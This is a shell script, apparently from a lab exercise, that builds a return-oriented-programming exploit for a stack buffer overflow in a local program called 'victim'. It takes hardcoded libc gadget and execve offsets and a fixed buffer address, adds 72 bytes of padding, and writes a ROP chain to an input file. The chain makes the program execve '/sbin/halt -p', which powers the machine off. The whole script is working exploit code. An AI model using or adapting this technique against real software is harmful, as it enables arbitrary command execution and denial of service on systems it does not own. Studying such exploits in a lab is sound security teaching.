#!/bin/sh

# libc /lib/x86_64-linux-gnu/libc.so.6

# address of buffer:
# 	0x7fffffffde40 for gdb victim
# 	0x7fffffffded0 for ./victim, 

# offset of libc:


# rdi, rsi, rdx
# /sbin/halt -p Null

# offset of execve
# 0x00000000000150db using ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "execve"
# 00000000000e4e30 using nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep execve

addr_buff="0x00007fffffffded0"
addr_libc="0x00007ffff79e4000"

filename="/sbin///////halt"
arg1="-p"

# Init syscall arguments gadgets
offset_rdi="0x2155f"
offset_rsi="0x23e6a"
offset_rdx=" 0x1b96"
offset_execve="0x00000000000e4e30"


addr_rdi=$( printf "%08x" $(($addr_libc + $offset_rdi)) )
addr_rsi=$( printf "%08x" $(($addr_libc + $offset_rsi)) )
addr_rdx=$( printf "%08x" $(($addr_libc + $offset_rdx)) )
addr_execve=$( printf "%08x" $(($addr_libc + $offset_execve)) )

addr_filename=$( printf "%08x" $(($addr_buff + 11*8)) )
addr_arg1=$( printf "%08x" $(($addr_buff + 14*8)) )
addr_addr_args=$( printf "%08x" $(($addr_buff + 7*8)) )


null="0000000000000000"

padding_buff="$(python3 -c 'print("90"*72)')"

echo -n "$padding_buff" >> input
echo -n "$addr_rdi" >> input
echo -n "$addr_filename" >> input
echo -n "$addr_rsi" >> input
echo -n "$addr_addr_args" >> input
echo -n "$addr_rdx" >> input
echo -n "$null" >> input
echo -n "$addr_execve" >> input
echo -n "$addr_filename" >> input
echo -n "$addr_arg1" >> input
echo -n "$null" >> input
echo -n "$filename" >> input
echo -n "$null" >> input
echo -n "$arg1" >> input
echo -n "$null" >> input